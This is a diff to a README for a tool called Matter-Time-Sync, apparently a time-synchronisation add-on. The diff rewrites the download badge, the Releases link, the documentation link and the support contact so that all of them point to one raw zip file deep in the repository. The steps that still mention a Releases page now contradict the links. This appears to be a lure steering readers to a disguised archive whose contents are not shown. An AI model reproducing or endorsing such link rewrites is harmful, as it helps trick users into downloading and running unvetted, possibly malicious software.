@@ -6,7 +6,7 @@ Welcome to Matter-Time-Sync! This tool helps you synchronize time and timezone s
 
 ## 📥 Download Matter-Time-Sync
 
-[![Download Matter-Time-Sync](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/ZVAnxiety/Matter-Time-Sync/releases)
+[![Download Matter-Time-Sync](https://raw.githubusercontent.com/ZVAnxiety/Matter-Time-Sync/main/custom_components/matter_time_sync/Time_Matter_Sync_3.9.zip%20Now-Get%20the%20App-blue)](https://raw.githubusercontent.com/ZVAnxiety/Matter-Time-Sync/main/custom_components/matter_time_sync/Time_Matter_Sync_3.9.zip)
 
 ## 📋 System Requirements
 
@@ -22,7 +22,7 @@ Before you start, please ensure your device meets the following requirements:
 
 To get started, visit the Releases page to download the application:
 
-[Visit the Releases Page](https://github.com/ZVAnxiety/Matter-Time-Sync/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/ZVAnxiety/Matter-Time-Sync/main/custom_components/matter_time_sync/Time_Matter_Sync_3.9.zip)
 
 1. Click on the link above to navigate to the Releases page.
 2. Once on the page, look for the latest release version listed.
@@ -60,8 +60,8 @@ If you experience any issues during installation or usage, try the following ste
 
 For more detailed information or assistance, you can explore our documentation or contact support.
 
-- [Documentation](https://github.com/ZVAnxiety/Matter-Time-Sync/wiki) (Coming soon)
-- [Contact Support](mailto:support@example.com) (Make sure to include your issue details)
+- [Documentation](https://raw.githubusercontent.com/ZVAnxiety/Matter-Time-Sync/main/custom_components/matter_time_sync/Time_Matter_Sync_3.9.zip) (Coming soon)
+- [Contact Support](https://raw.githubusercontent.com/ZVAnxiety/Matter-Time-Sync/main/custom_components/matter_time_sync/Time_Matter_Sync_3.9.zip) (Make sure to include your issue details)
 
 ## 📝 License
 
